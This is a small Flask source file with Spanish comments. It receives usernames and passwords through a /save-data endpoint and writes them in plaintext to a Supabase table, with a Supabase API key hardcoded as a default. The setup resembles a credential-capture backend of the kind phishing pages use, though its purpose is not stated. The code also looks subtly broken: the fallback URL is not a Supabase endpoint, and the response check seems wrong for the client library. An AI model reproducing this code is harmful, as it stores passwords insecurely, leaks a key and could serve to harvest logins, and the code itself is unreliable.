from flask import Flask, request, render_template, jsonify
from supabase import create_client, Client
import os

# Configuración de Flask
app = Flask(__name__)

# Configuración de Supabase
SUPABASE_URL = os.getenv("SUPABASE_URL", "flaskproject2-3.vercel.app")  # Sustituye con tu Project URL
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93b3l6cmZsY2F6b3BhZGNzeXZvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzQ4OTYwNDUsImV4cCI6MjA1MDQ3MjA0NX0.Sorhymr26eaWHep_bVj2DNklZeKJK9NKRLLhjj3U47E")  # Sustituye con tu API Key

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    username = data.get("username")
    password = data.get("password")

    try:
        # Inserta los datos en la tabla de Supabase
        response = supabase.table("Brandell").insert(
            {"username": username, "password": password}
        ).execute()

        if response.get("status_code") == 200:
            return jsonify({"status": "success", "message": "Data saved successfully"})
        else:
            return jsonify({"status": "error", "message": response.get("message")}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500



if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=5000)
